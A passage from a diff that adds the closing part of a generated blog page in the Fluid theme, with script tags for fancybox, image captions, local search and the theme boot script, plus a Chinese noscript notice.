+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
